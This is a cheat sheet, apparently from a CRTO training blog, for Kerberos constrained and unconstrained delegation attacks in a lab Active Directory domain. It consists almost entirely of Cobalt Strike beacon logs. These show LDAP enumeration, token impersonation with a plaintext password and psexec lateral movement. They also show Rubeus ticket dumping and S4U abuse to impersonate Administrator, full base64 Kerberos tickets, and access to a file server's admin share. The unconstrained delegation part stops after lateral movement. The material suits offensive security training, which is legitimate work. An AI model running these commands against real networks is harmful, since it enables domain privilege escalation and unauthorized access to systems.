---
title: CRTO Cheetsheet
date: 2026-02-17 18:49 +0100
categories: [Cheetsheet, CRTO]
tags: [CRTO, Hacking, Active Directory, Windows, Kerberos, Constrained Delegation, Unconstrained Delegation, RBCD, Rubeus]
---

# Kerberos
## Constrained Delegation
### Detection
```powershell
[12/07 22:01:34] beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
[12/07 22:01:34] [+] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 22:01:34] [*] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 22:01:34] [+] host called home, sent: 12702 bytes
[12/07 22:01:34] [+] received output:
Binding to 10.10.120.1
[12/07 22:01:34] [+] received output:
[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*))
[*] Scope of search value: 3
[*] Returning specific attribute(s): samAccountName,msDS-AllowedToDelegateTo

--------------------
sAMAccountName: LON-WS-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1.contoso.com, cifs/lon-fs-1
retreived 1 results total
```

```powershell
[12/07 22:02:19] beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl
[12/07 22:02:19] [+] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 22:02:19] [*] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 22:02:19] [+] host called home, sent: 12679 bytes
[12/07 22:02:19] [+] received output:
Binding to 10.10.120.1
[12/07 22:02:19] [+] received output:
[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (&(samAccountType=805306369)(samaccountname=lon-ws-1$))
[*] Scope of search value: 3
[*] Returning specific attribute(s): userAccountControl

--------------------
userAccountControl: 16781312
retreived 1 results total
```

```powershell
PS C:\Users\Attacker> [Convert]::ToBoolean(16781312 -band 16777216)
True
```
### Exploitation
```powershell
[12/07 22:04:09] beacon> make_token CONTOSO\rsteel Passw0rd!
[12/07 22:04:09] [+] host called home, sent: 42 bytes
[12/07 22:04:09] [+] Impersonated CONTOSO\rsteel (netonly)
```

```powershell
[12/07 22:04:43] beacon> jump psexec64 lon-ws-1 smb
[12/07 22:04:43] [+] host called home, sent: 395616 bytes
[12/07 22:05:06] [+] received output:
Started service 453f865 on lon-ws-1
[12/07 22:05:06] [+] established link to child beacon: 10.10.120.10
```
<img width="1154" height="285" alt="image" src="https://github.com/user-attachments/assets/0bc6dd6d-8d0c-4563-a6c0-27222990b45f" />

```powershell
[12/07 22:06:38] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
[12/07 22:06:44] [*] Tasked beacon to run .NET program: Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
[12/07 22:06:44] [+] host called home, sent: 577868 bytes
[12/07 22:06:46] [+] job registered with id 0
[12/07 22:06:46] [+] [job 0] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


Action: Dump Kerberos Ticket Data (All Users)

[*] Target service  : krbtgt
[*] Target LUID     : 0x3e7
[*] Current LUID    : 0x3e7

  UserName                 : LON-WS-1$
  Domain                   : CONTOSO
  LogonId                  : 0x3e7
  UserSID                  : S-1-5-18
  AuthenticationPackage    : Negotiate
  LogonType                : 0
  LogonTime                : 07/12/2025 13:56:29
  LogonServer              : 
  LogonServerDNSDomain     : contoso.com
  UserPrincipalName        : LON-WS-1$@contoso.com


    ServiceName              :  krbtgt/CONTOSO.COM
    ServiceRealm             :  CONTOSO.COM
    UserName                 :  LON-WS-1$ (NT_PRINCIPAL)
    UserRealm                :  CONTOSO.COM
    StartTime                :  07/12/2025 22:06:46
    EndTime                  :  08/12/2025 07:58:39
    RenewTill                :  14/12/2025 21:58:39
    Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
    KeyType                  :  rc4_hmac
    Base64(key)              :  rDvZJMn+NFCDaLTU6j4dHA==
    Base64EncodedTicket   :

      doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5HmPvEKRSe3SrihMJwFo4xknHqNvwDD6UVkMdzTCu8IRnCmLpCfzfuefsJSRi9HqRhPYdvunB0EniL1EC4Hh1sd78+shBydJ2KFIWvDO/84GU5hDpZZuNQjRFH/VMI0ReuRKVm0IImJtxQdmgjIPkQ8PI95nJ567OZBbOEkIz29TpI2flHJmplSn85QgfXiPLQO5SwEnAyA+Hau9fzcxkiky5ZZ4e0tmZuXXoKqAsl1ayitmOxkMwpoQNyGr5WTWo3BL4SgG/nM0ntn4ubth8+uuTMk/G4slvhSAT6Mcac3/VCsawC9lco5HR+4Sd6zCb3FDRXsvj/f/2tXgTpfKg9ukFHNxNkB3LF+3DVjSOzk82O+5hYoEKmaSBWpChPKKEGAQYD2ktKhgBstNyJniHPnITNrTTsk/9DYZ2gRnheJZSRlCMF9x++G+OdOKNGXh1mASo5hpzfiH2sYaqYcx/aVIEJyy6iGclIIc9+8DNpcnx9s4jy14YrmaZPRXyVgKiqqgwZ4a5XteXRC0tSngzl4jceLxI7scztqcmuYREcqc3M1zSKBjKi++IEsC4N45xO8Kry/kXZc2QaGg1t7HnXF5qYVbiCjvTbeJ5hYTTVTqlRbeOjqmL1LjsNIp9tthZ8FdHvTL2R77i8nIuh9bxhji/ZKSnuunBry+iOjzsK5BCx1SkDPiDqaimumvtWuWhMJMJ5jS8YdFKVt4TAzF6zoPPU+mExrP9EKFMDkxqFKJstl9xHUQo8msUCGvbKCvxRiP+Rp9uBy3DNqSLk5tKwsqG5TI+JJ6Iii86JryUj4f2E4KCfCAPPwe2dFAWGOjgGGNWLUe7dQZUSNvSJgW+Uafv+pwtkgNxh0XgVYfRi+BDp+kXD4bHT+UmwkRsMvP/HA9svGQ8sVInIT9CdBC7BVYOugDHU6QTNrGVdQT/TC9dQWuY0RayYQq24Ytms3WSHR5Kf0vAYxNIId2cm1l7QviZBvuFEaoCWMZoLaVCyFDf7WnL631yVFqTX7lHnfe5THFDz6kMBQ4JMhtsMPzB5/l0BffUV1ywkke03P8x61rNTYrut8dT+rISenFakJwxuo7qswL2lCxY4CQbfN9g1JbwG9cKMYhRoGrZj5pRjOUcBtasuX/xgiMrKJ2Ye+TLjdf2DU48nW6jwCRf99eljmbhmQYdMb9HnO5wZPOUb6lVMRIWCEa2gbj+ECHTQcG1TIH8FcRPAU/USZFmPHvZmsOTrkHFe7h43NtpWEvoI/AVfNCXJ2CbcLe8b6G1wkT0fubBHyViIko+X+6Qa11Ac7KHs8afYxa6Njq7V0M1VMiQP5+nZmQXDVhZuP3MF6ZT6EsfBdxrSk+LokwmHdutc/AbXTMStOLo6eQ3GZ006DOir/0Prg21R5oL3q3m+9kR5x0pHQmsYRoCzGDTgsQqcw5mLzFfcPXilqOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEKw72STJ/jRQg2i01Oo+HRyhDRsLQ09OVE9TTy5DT02iFjAUoAMCAQGhDTALGwlMT04tV1MtMSSjBwMFAGChAAClERgPMjAyNTEyMDcyMjA2NDZaphEYDzIwMjUxMjA4MDc1ODM5WqcRGA8yMDI1MTIxNDIxNTgzOVqoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N


[12/07 22:06:47] [+] job 0 completed
```

```powershell
[12/07 22:08:07] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC0NPTlRPU08uQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtDT05UT1NPLkNPTaOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5HmPvEKRSe3SrihMJwFo4xknHqNvwDD6UVkMdzTCu8IRnCmLpCfzfuefsJSRi9HqRhPYdvunB0EniL1EC4Hh1sd78+shBydJ2KFIWvDO/84GU5hDpZZuNQjRFH/VMI0ReuRKVm0IImJtxQdmgjIPkQ8PI95nJ567OZBbOEkIz29TpI2flHJmplSn85QgfXiPLQO5SwEnAyA+Hau9fzcxkiky5ZZ4e0tmZuXXoKqAsl1ayitmOxkMwpoQNyGr5WTWo3BL4SgG/nM0ntn4ubth8+uuTMk/G4slvhSAT6Mcac3/VCsawC9lco5HR+4Sd6zCb3FDRXsvj/f/2tXgTpfKg9ukFHNxNkB3LF+3DVjSOzk82O+5hYoEKmaSBWpChPKKEGAQYD2ktKhgBstNyJniHPnITNrTTsk/9DYZ2gRnheJZSRlCMF9x++G+OdOKNGXh1mASo5hpzfiH2sYaqYcx/aVIEJyy6iGclIIc9+8DNpcnx9s4jy14YrmaZPRXyVgKiqqgwZ4a5XteXRC0tSngzl4jceLxI7scztqcmuYREcqc3M1zSKBjKi++IEsC4N45xO8Kry/kXZc2QaGg1t7HnXF5qYVbiCjvTbeJ5hYTTVTqlRbeOjqmL1LjsNIp9tthZ8FdHvTL2R77i8nIuh9bxhji/ZKSnuunBry+iOjzsK5BCx1SkDPiDqaimumvtWuWhMJMJ5jS8YdFKVt4TAzF6zoPPU+mExrP9EKFMDkxqFKJstl9xHUQo8msUCGvbKCvxRiP+Rp9uBy3DNqSLk5tKwsqG5TI+JJ6Iii86JryUj4f2E4KCfCAPPwe2dFAWGOjgGGNWLUe7dQZUSNvSJgW+Uafv+pwtkgNxh0XgVYfRi+BDp+kXD4bHT+UmwkRsMvP/HA9svGQ8sVInIT9CdBC7BVYOugDHU6QTNrGVdQT/TC9dQWuY0RayYQq24Ytms3WSHR5Kf0vAYxNIId2cm1l7QviZBvuFEaoCWMZoLaVCyFDf7WnL631yVFqTX7lHnfe5THFDz6kMBQ4JMhtsMPzB5/l0BffUV1ywkke03P8x61rNTYrut8dT+rISenFakJwxuo7qswL2lCxY4CQbfN9g1JbwG9cKMYhRoGrZj5pRjOUcBtasuX/xgiMrKJ2Ye+TLjdf2DU48nW6jwCRf99eljmbhmQYdMb9HnO5wZPOUb6lVMRIWCEa2gbj+ECHTQcG1TIH8FcRPAU/USZFmPHvZmsOTrkHFe7h43NtpWEvoI/AVfNCXJ2CbcLe8b6G1wkT0fubBHyViIko+X+6Qa11Ac7KHs8afYxa6Njq7V0M1VMiQP5+nZmQXDVhZuP3MF6ZT6EsfBdxrSk+LokwmHdutc/AbXTMStOLo6eQ3GZ006DOir/0Prg21R5oL3q3m+9kR5x0pHQmsYRoCzGDTgsQqcw5mLzFfcPXilqOB1DCB0aADAgEAooHJBIHGfYHDMIHAoIG9MIG6MIG3oBswGaADAgEXoRIEEKw72STJ/jRQg2i01Oo+HRyhDRsLQ09OVE9TTy5DT02iFjAUoAMCAQGhDTALGwlMT04tV1MtMSSjBwMFAGChAAClERgPMjAyNTEyMDcyMjA2NDZaphEYDzIwMjUxMjA4MDc1ODM5WqcRGA8yMDI1MTIxNDIxNTgzOVqoDRsLQ09OVE9TTy5DT02pIDAeoAMCAQKhFzAVGwZrcmJ0Z3QbC0NPTlRPU08uQ09N /impersonateuser:Administrator /nowrap
[12/07 22:08:13] [+] host called home, sent: 581728 bytes
[12/07 22:08:15] [+] job registered with id 1
[12/07 22:08:15] [+] [job 1] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 

[*] Action: S4U


[12/07 22:08:15] [+] [job 1] received output:
[*] Action: S4U

[*] Building S4U2self request for: 'LON-WS-1$@CONTOSO.COM'

[12/07 22:08:15] [+] [job 1] received output:
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2self request to 10.10.120.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'LON-WS-1$@CONTOSO.COM'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'cifs/lon-fs-1'
[*] Building S4U2proxy request for service: 'cifs/lon-fs-1'
[*] Using domain controller: lon-dc-1.contoso.com (10.10.120.1)
[*] Sending S4U2proxy request to domain controller 10.10.120.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/lon-fs-1':

      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

[12/07 22:08:16] [+] job 1 completed
```

```powershell
[12/07 22:11:15] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket: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
[12/07 22:11:21] [+] host called home, sent: 582472 bytes
[12/07 22:11:22] [+] job registered with id 2
[12/07 22:11:22] [+] [job 2] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3 


[*] Action: Create Process (/netonly)


[*] Using CONTOSO.COM\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : CONTOSO.COM
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4548
[+] Ticket successfully imported!
[+] LUID            : 0x119ed4

[12/07 22:11:23] [+] job 2 completed
```

```powershell
[12/07 22:12:20] beacon> steal_token 4548
[12/07 22:12:20] [+] host called home, sent: 12 bytes
[12/07 22:12:20] [+] Impersonated NT AUTHORITY\SYSTEM
```

```powershell
[12/07 22:12:45] beacon> run klist
[12/07 22:12:45] [+] host called home, sent: 23 bytes
[12/07 22:12:45] [+] job registered with id 3
[12/07 22:12:45] [+] [job 3] received output:

Current LogonId is 0:0x119ed4

Cached Tickets: (1)

#0>	Client: Administrator @ CONTOSO.COM
	Server: cifs/lon-fs-1 @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
	Start Time: 12/7/2025 22:08:15 (local)
	End Time:   12/8/2025 7:58:39 (local)
	Renew Time: 12/14/2025 21:58:39 (local)
	Session Key Type: AES-128-CTS-HMAC-SHA1-96
	Cache Flags: 0 
	Kdc Called: 

[12/07 22:12:45] [+] job 3 completed
```

```powershell
[12/07 22:13:10] beacon> ls \\lon-fs-1\c$
[12/07 22:13:10] [+] host called home, sent: 31 bytes
[12/07 22:13:10] [*] Listing: \\lon-fs-1\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/23/2025 15:44:52   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     02/20/2025 10:37:21   Files
          dir     05/08/2021 08:20:24   PerfLogs
          dir     04/11/2025 12:05:23   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     04/11/2025 10:57:19   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/24/2025 14:18:02   System Volume Information
          dir     01/24/2025 14:17:49   Users
          dir     04/11/2025 10:57:34   Windows
 12kb     fil     12/07/2025 13:56:28   DumpStack.log.tmp
 1gb      fil     12/07/2025 13:56:28   pagefile.sys
```

## Unconstrained Delegation
### Detection
```powershell
[12/07 12:36:06] beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname
[12/07 12:36:06] [+] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 12:36:06] [*] Running ldapsearch (T1018, T1069.002, T1087.002, T1087.003, T1087.004, T1482)
[12/07 12:36:09] [+] host called home, sent: 12700 bytes
[12/07 12:36:09] [+] received output:
Binding to 10.10.120.1
[12/07 12:36:09] [+] received output:
[*] Distinguished name: DC=contoso,DC=com
[*] targeting DC: \\lon-dc-1.contoso.com
[*] Filter: (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))
[*] Scope of search value: 3
[*] Returning specific attribute(s): samaccountname

--------------------
sAMAccountName: LON-DC-1$
--------------------
sAMAccountName: LON-WS-1$
retreived 2 results total
```
### Exploitation
```powershell
[12/07 12:36:41] beacon> make_token CONTOSO\rsteel Passw0rd!
[12/07 12:36:41] [*] Tasked beacon to create a token for CONTOSO\rsteel
[12/07 12:36:44] [+] host called home, sent: 42 bytes
[12/07 12:36:45] [+] Impersonated CONTOSO\rsteel (netonly)
```

```powershell
[12/07 12:37:08] beacon> jump psexec64 lon-ws-1 smb
[12/07 12:37:10] [+] host called home, sent: 395616 bytes
[12/07 12:37:33] [+] received output:
Started service 30cee2a on lon-ws-1
[12/07 12:37:33] [+] established link to child beacon: 10.10.120.10
```
